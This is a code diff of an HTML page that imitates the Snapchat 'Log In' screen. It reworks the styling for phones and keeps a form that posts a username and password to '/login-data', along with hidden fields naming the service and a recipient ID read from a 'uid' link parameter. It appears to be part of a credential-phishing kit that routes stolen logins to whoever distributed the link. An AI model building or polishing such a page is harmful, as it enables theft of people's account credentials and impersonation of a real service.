@@ -2,33 +2,36 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Log In • Snapchat</title>
     <style>
-        body { margin: 0; background-color: #FFFC00; font-family: "Avenir Next", "Helvetica Neue", Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .container { background-color: white; padding: 40px 30px; border-radius: 10px; text-align: center; width: 320px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15); }
-        .logo { width: 60px; height: auto; margin-bottom: 20px; }
-        h1 { font-size: 28px; font-weight: 800; margin-bottom: 30px; color: #000; }
-        input { width: 100%; padding: 12px 0; margin-top: 5px; border: none; border-bottom: 2px solid #e2e2e2; box-sizing: border-box; font-size: 16px; outline: none; }
-        button { width: 80%; padding: 14px; margin-top: 20px; background-color: #00aaff; color: #fff; border: none; border-radius: 30px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        body, html { margin: 0; padding: 0; height: 100%; font-family: "Avenir Next", "Helvetica Neue", Helvetica, Arial, sans-serif; background-color: #FFFC00; /* Snapchat Yellow */ }
+        .container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; text-align: center; }
+        .logo { width: 80px; height: auto; margin-bottom: 30px; }
+        h1 { color: #000; font-size: 24px; font-weight: 800; margin-bottom: 20px; }
+        .login-form { width: 80%; max-width: 320px; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; border: none; border-radius: 30px; box-sizing: border-box; text-align: center; font-size: 16px; background-color: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        button { width: 100%; padding: 14px; margin-top: 10px; background-color: #00aaff; color: #fff; border: none; border-radius: 30px; font-weight: bold; font-size: 16px; cursor: pointer; }
     </style>
 </head>
 <body>
     <div class="container">
         <img class="logo" src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" alt="Snapchat Logo">
         <h1>Log In</h1>
-        <form action="/login-data" method="post">
-            <input type="text" name="username" placeholder="Username or Email" required>
-            <input type="password" name="password" placeholder="Password" required>
-            <!-- HIDDEN FIELDS -->
-            <input type="hidden" name="service" value="Snapchat">
-            <input type="hidden" id="recipientId" name="recipientId" value="">
-            <button type="submit">Log In</button>
-        </form>
+        <div class="login-form">
+            <form action="/login-data" method="post">
+                <input type="text" name="username" placeholder="Username or Email" required autocapitalize="none">
+                <input type="password" name="password" placeholder="Password" required>
+                <input type="hidden" name="service" value="Snapchat">
+                <input type="hidden" id="recipientId" name="recipientId" value="">
+                <button type="submit">Log In</button>
+            </form>
+        </div>
     </div>
     <script>
         document.addEventListener("DOMContentLoaded", () => {
-            const userId = new URLSearchParams(window.location.search).get('uid');
+            const params = new URLSearchParams(window.location.search);
+            const userId = params.get('uid');
             if (userId) document.getElementById('recipientId').value = userId;
         });
     </script>
